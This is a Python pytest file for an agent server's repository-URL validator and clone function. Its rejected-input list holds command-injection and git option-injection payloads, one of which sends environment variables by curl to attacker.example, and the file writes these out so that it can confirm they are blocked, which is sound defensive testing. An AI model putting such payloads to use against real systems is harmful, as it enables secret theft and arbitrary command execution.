from __future__ import annotations

import asyncio
import uuid
from pathlib import Path

import pytest
from pydantic import ValidationError

from app.agent_server import clone_repo
from app.schemas.run import RunCreate, validate_repo_url


def _run(repo_url: str) -> RunCreate:
    return RunCreate(
        name="t",
        repo_url=repo_url,
        persona_environments=[],
        journey_id=uuid.uuid4(),
    )


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/mpk-droid/SimCrew.git",
        "https://github.com/mpk-droid/SimCrew",
        "https://gitlab.example.com/group/sub/repo.git",
        "git@github.com:mpk-droid/SimCrew.git",
    ],
)
def test_accepts_normal_urls(url: str) -> None:
    assert _run(url).repo_url == url


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/x/y.git; env | curl -d @- https://attacker.example",
        "https://github.com/x/y.git && id",
        "https://github.com/x/$(id).git",
        "https://github.com/x/`id`.git",
        "--upload-pack=touch /tmp/pwned",
        "-c core.sshCommand=id",
        "file:///etc",
        "ext::sh -c id",
        "http://github.com/x/y.git",
        "https://",
        "",
    ],
)
def test_rejects_dangerous_or_unsupported_urls(url: str) -> None:
    with pytest.raises(ValidationError):
        _run(url)


def test_extra_schemes_are_opt_in(monkeypatch: pytest.MonkeyPatch) -> None:
    with pytest.raises(ValueError):
        validate_repo_url("git://host.docker.internal:9418/snap.git")
    monkeypatch.setenv("SU_ALLOWED_REPO_SCHEMES", "https,git")
    assert validate_repo_url("git://host.docker.internal:9418/snap.git")


def test_clone_never_runs_shell_metacharacters(tmp_path: Path) -> None:
    marker = tmp_path / "pwned"
    with pytest.raises(RuntimeError):
        asyncio.run(
            clone_repo(
                f"https://invalid.invalid/x.git;touch {marker}", str(tmp_path / "r")
            )
        )
    assert not marker.exists()


def test_clone_treats_leading_dash_as_url_not_option(tmp_path: Path) -> None:
    marker = tmp_path / "pwned"
    with pytest.raises(RuntimeError):
        asyncio.run(clone_repo(f"--upload-pack=touch {marker}", str(tmp_path / "r")))
    assert not marker.exists()
